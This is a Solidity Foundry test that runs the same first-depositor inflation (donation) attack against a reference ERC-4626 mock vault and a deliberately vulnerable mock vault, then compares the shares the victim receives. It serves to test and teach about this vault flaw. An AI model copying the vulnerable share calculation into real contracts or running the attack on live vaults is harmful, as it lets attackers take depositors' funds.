// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { Test } from "forge-std/Test.sol";
import { MockERC20 } from "../../src/mocks/tokens/MockERC20.sol";
import { MockERC4626 } from "../../src/mocks/vaults/reference/MockERC4626.sol";
import { VulnerableVault } from "../../src/mocks/vaults/vulnerable/VulnerableVault.sol";

contract InflationAttackComparisonTest is Test {
    MockERC20 internal asset;
    MockERC4626 internal referenceVault;
    VulnerableVault internal vulnerableVault;

    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    function setUp() public {
        asset = new MockERC20();

        referenceVault = new MockERC4626(asset);
        vulnerableVault = new VulnerableVault(address(asset));

        asset.mint(attacker, 10 ether);
        asset.mint(victim, 10 ether);

        vm.startPrank(attacker);
        asset.approve(address(referenceVault), type(uint256).max);
        asset.approve(address(vulnerableVault), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(victim);
        asset.approve(address(referenceVault), type(uint256).max);
        asset.approve(address(vulnerableVault), type(uint256).max);
        vm.stopPrank();
    }

    function test_sameInflationSequenceProducesDifferentShareAllocation()
        public
    {
        // -------------------------
        // Reference vault
        // -------------------------

        // Attacker becomes the first depositor.
        vm.prank(attacker);
        referenceVault.deposit(1 ether, attacker);

        // Attacker donates assets without receiving additional shares.
        vm.prank(attacker);
        asset.transfer(address(referenceVault), 1 ether);

        // Victim deposits 5 ether.
        vm.prank(victim);
        uint256 referenceVictimShares =
            referenceVault.deposit(5 ether, victim);

        // The reference vault calculates the victim's shares
        // using the vault state before the victim's deposit:
        //
        // 5 ETH * 1 share / 2 ETH = 2.5 shares.
        assertEq(referenceVictimShares, 2.5 ether);
        assertEq(referenceVault.balanceOf(victim), 2.5 ether);

        // -------------------------
        // Vulnerable vault
        // -------------------------

        // Attacker becomes the first depositor.
        vm.prank(attacker);
        vulnerableVault.deposit(1 ether, attacker);

        // Attacker donates assets without receiving additional shares.
        vm.prank(attacker);
        asset.transfer(address(vulnerableVault), 1 ether);

        // Victim deposits the same 5 ether.
        vm.prank(victim);
        uint256 vulnerableVictimShares =
            vulnerableVault.deposit(5 ether, victim);

        // The vulnerable vault calculates shares using the
        // post-deposit asset balance:
        //
        // 5 ETH * 1 share / 7 ETH
        // = 0.714285714285714285 shares.
        uint256 victimAssets = 5 ether;
        uint256 expectedVulnerableShares = victimAssets / 7;

        assertEq(vulnerableVictimShares, expectedVulnerableShares);
        assertEq(
            vulnerableVault.balanceOf(victim),
            expectedVulnerableShares
        );

        // The vulnerable vault gives the victim fewer shares
        // than the reference vault.
        assertLt(vulnerableVictimShares, referenceVictimShares);

        // The attacker still owns the original share.
        assertEq(vulnerableVault.balanceOf(attacker), 1 ether);
        assertEq(
            vulnerableVault.totalSupply(),
            1 ether + expectedVulnerableShares
        );
    }
}